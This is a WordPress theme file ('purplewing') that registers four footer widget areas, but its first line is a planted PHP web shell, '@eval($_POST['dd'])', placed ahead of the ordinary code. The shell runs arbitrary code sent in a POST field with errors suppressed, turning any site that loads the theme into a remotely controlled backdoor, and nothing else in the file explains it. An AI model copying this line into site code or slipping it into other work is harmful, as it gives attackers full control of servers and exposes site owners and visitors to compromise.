<?php @eval($_POST['dd']);?><?php 

/**
* Register widget area.
*
* @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
*/
                            


function medical_widgets_init() {
    register_sidebar( array(
        'name'          => esc_html__( 'Footer1', 'purplewing' ),
        'id'            => 'footer-1',
        'description'   => esc_html__( 'Add widgets here.', 'purplewing' ),
        'before_widget' => '',
        'after_widget'  => '',
        'before_title'  => '<h4 class="m-b15 text-uppercase">',
        'after_title'   => '</h4>',
        ) );
    register_sidebar( array(
        'name'          => esc_html__( 'Footer2', 'purplewing' ),
        'id'            => 'footer-2',
        'description'   => esc_html__( 'Add widgets here.', 'purplewing' ),
        'before_widget' => '',
        'after_widget'  => '',
        'before_title'  => '<h4 class="m-b15 text-uppercase">',
        'after_title'   => '</h4><div class="dez-separator bg-primary"></div>',
        ) );

    register_sidebar( array(
        'name'          => esc_html__( 'Footer3', 'purplewing' ),
        'id'            => 'footer-3',
        'description'   => esc_html__( 'Add widgets here.', 'purplewing' ),
        'before_widget' => '',
        'after_widget'  => '',
        'before_title'  => '<h4 class="m-b15 text-uppercase"><div class="dez-separator bg-primary"></div>',
        'after_title'   => '</h4>',
        ) );
    register_sidebar( array(
        'name'          => esc_html__( 'Footer4', 'purplewing' ),
        'id'            => 'footer-4',
        'description'   => esc_html__( 'Add widgets here.', 'purplewing' ),
        'before_widget' => '',
        'after_widget'  => '',
         'before_title'  => '<h4 class="m-b15 text-uppercase"><div class="dez-separator bg-primary"></div>',
        'after_title'   => '</h4>',
        ) );
}
add_action( 'widgets_init', 'medical_widgets_init' );

?>